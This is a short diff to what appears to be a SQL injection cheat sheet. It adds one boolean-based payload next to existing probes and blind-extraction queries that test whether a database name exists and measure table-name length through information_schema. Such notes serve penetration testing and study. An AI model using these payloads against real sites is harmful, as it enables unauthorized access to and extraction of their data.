@@ -965,6 +965,7 @@ reference: [https://portswigger.net/web-security/sql-injection/examining-the-dat
 ~~~ sql
 -- boolean-based SQLi
 ' AND 1=1 -- //
+1'+AND+'A'+LIKE+'A'--
 
 if((select count(*) from information_schema.tables where table_schema='{DBNAME}') = 1, 1, 0) # check exist dbname
 LENGTH((select table_name from information_schema.tables where table_schema='{DBNAME}'))={i} # examining dbname length
